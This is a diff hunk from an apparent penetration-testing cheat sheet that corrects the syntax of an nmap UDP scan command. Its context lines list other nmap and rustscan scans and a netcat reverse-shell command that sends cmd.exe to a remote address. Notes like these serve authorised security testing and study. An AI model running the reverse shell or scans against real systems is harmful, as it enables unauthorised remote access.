@@ -66,7 +66,7 @@ nc.exe 192.168.100.113 4444 –e cmd.exe
 #namp
 nmap -sS -Pn -n -A x.x.x.x
 sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244
-nmap -SU -p- -- max-retries 0 -min-rate 500 x.x.x.x       #UDP scan
+sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x       #UDP scan
 
 #rustscan
 rustscan -a IP --ulimit 5000
